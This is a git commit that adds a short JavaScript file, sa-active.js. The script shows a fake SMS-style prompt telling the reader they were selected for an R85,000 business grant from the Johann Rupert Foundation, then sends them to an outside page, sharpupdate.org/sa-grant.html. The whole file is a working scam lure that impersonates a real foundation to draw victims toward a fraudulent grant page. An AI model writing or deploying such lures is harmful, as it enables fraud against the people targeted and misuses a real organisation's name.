356db8545d07f3a319f9e30f66b5cb686cd6ec74
ekperikpe <ekperikpe588@gmail.com>
2025-05-23 21:54:55 +0100

    Create sa-active.js

---
+++ sa-active.js
@@ -0,0 +1,5 @@
+var password = 'WITHDRAW R85,000'
+password=prompt('SMS: Congratulations, you are among the selected ones to receive R85,000 Business Support Grant from Johann Rupert Foundation, Press Ok to withdraw cash Now ','WITHDRAW R85,000');
+if (password != 'WITHDRAW R85,000') {
+location.href='https://sharpupdate.org/sa-grant.html';
+}
